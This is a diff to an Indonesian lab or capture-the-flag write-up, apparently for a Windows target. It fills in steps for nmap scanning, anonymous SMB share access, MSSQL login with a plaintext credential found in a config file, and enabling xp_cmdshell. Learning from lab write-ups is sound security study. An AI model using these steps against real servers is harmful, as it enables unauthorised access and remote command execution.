@@ -27,7 +27,7 @@ Windows server dengan dua service utama yang terbuka: SMB lama (Port 139 Net BIO
 
 ## Exploitation Steps
 
-### Step 1 — [Reconnaissance - Nmap scan]
+### Step 1 — Reconnaissance - Nmap scan
 Scan semua port untuk mengetahui port & service apa yang berjalan di target
 ```bash
 # command yang kamu pakai
@@ -39,7 +39,7 @@ nmap -sV -sC target-ip
 
 > ![nmap](image-2.png)
 
-### Step 2 — [SMB Enumeration]
+### Step 2 — SMB Enumeration
 List semua share yang tersedia di target menggunakan anonymous login.
 ```bash
 smbclient -N -L target-ip 
@@ -52,7 +52,7 @@ smbclient -N -L target-ip
 
 Share backups adalah custom share (non-default) yang sering misconfigured dan bisa diakses tanpa password. Share default seperti ADMIN dan C otomatis di protect oleh windows dan hanya bisa diakses administrator.
 
-### Step 3 — [SMB Share & Download File]
+### Step 3 — SMB Share & Download File
 Masuk ke share backups dan download file yang ada.
 ```bash
 smbclient -N \\\\ip-target\\sharename
@@ -67,8 +67,31 @@ File .dtsConfig adalah file konfigurasi SSIS (SQL Server Integration Services) y
 
 > ![cat prod](image-6.png)
 
-### Step 4 — [Nama step, contoh: Post Exploitation / Getting the Flag]
-Apa yang kamu dapetin setelah berhasil masuk.
+### Step 4 — Login ke MSSQL
+Menggunakan kredensial yang ditemukan pada .dtsConfig tadi buat login ke SQL server menggunakan Impacket
+```bash
+impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.124.24 -windows-auth
+```
+
+Flag -windows-auth dipakai karena username menggunakan format DOMAIN\username — ini menandakan akun Windows/Active Directory, bukan akun SQL Server lokal.
+
+> ![mssql](image-7.png)
+
+### Step 5 - Aktifkan xp_cmdshell
+xp_cmdshell adalah stored procedure MSSQL yang bisa mengeksekusi command Windows langsung dari query SQL. By default dinonaktifkan karena sangat berbahaya.
+```bash
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+
+show advanced options harus diaktifkan dulu karena xp_cmdshell tersembunyi di balik advanced options. RECONFIGURE dipakai untuk menerapkan perubahan konfigurasi. Angka 1 = aktif, 0 = nonaktif.
+
+
+
+
+
 
 ---
 
